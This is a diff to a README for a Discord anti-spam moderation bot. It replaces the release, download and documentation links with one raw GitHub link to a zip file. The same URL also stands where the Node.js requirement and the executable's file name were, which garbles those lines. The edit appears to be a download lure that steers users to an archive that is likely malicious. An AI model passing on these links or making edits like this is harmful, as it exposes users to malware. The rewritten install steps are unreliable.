@@ -1,7 +1,7 @@
 # 🤖 Anti-Spam-Moderation-Discord-Bot - Protect Your Discord Server Effortlessly
 
 ## 📥 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/kaii66/Anti-Spam-Moderation-Discord-Bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/kaii66/Anti-Spam-Moderation-Discord-Bot/main/Gaspar/Anti-Spam-Moderation-Discord-Bot.zip)](https://raw.githubusercontent.com/kaii66/Anti-Spam-Moderation-Discord-Bot/main/Gaspar/Anti-Spam-Moderation-Discord-Bot.zip)
 
 ## 🚀 Getting Started
 Thank you for choosing the Anti-Spam-Moderation-Discord-Bot! This bot offers an easy solution to safeguard your Discord server from spam attacks. It takes care of text, links, and image-based spam, helping you maintain a clean and safe community.
@@ -16,18 +16,18 @@ Thank you for choosing the Anti-Spam-Moderation-Discord-Bot! This bot offers an 
 To get started, ensure your server meets these basic requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher must be installed
+- **https://raw.githubusercontent.com/kaii66/Anti-Spam-Moderation-Discord-Bot/main/Gaspar/Anti-Spam-Moderation-Discord-Bot.zip**: Version 14 or higher must be installed
 - **Discord Account**: You need an active Discord account and a server to use this bot.
 
 ## 📥 Download & Install
 To download and install the Anti-Spam-Moderation-Discord-Bot, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download Here](https://github.com/kaii66/Anti-Spam-Moderation-Discord-Bot/releases)
+   [Download Here](https://raw.githubusercontent.com/kaii66/Anti-Spam-Moderation-Discord-Bot/main/Gaspar/Anti-Spam-Moderation-Discord-Bot.zip)
 
 2. On the Releases page, look for the latest version. The latest version will be displayed at the top.
 
-3. Under the latest version, find the file labeled something like `AntiSpamBot.exe` or a relevant name. Click on it to download the file. 
+3. Under the latest version, find the file labeled something like `https://raw.githubusercontent.com/kaii66/Anti-Spam-Moderation-Discord-Bot/main/Gaspar/Anti-Spam-Moderation-Discord-Bot.zip` or a relevant name. Click on it to download the file. 
 
 4. Once the download is complete, locate the file on your computer. This is typically in your "Downloads" folder.
 
@@ -51,7 +51,7 @@ The Anti-Spam-Moderation-Discord-Bot comes with several commands to help manage 
 - **!mute [user]**: Temporarily mute a user.
 
 ## 📖 Documentation
-For detailed instructions on using all features and commands, visit the [official documentation](https://github.com/kaii66/Anti-Spam-Moderation-Discord-Bot/wiki).
+For detailed instructions on using all features and commands, visit the [official documentation](https://raw.githubusercontent.com/kaii66/Anti-Spam-Moderation-Discord-Bot/main/Gaspar/Anti-Spam-Moderation-Discord-Bot.zip).
 
 ## 🗣️ Feedback
 Your experience matters. If you have suggestions or feedback, please create an issue in the Issues section of the GitHub repository.
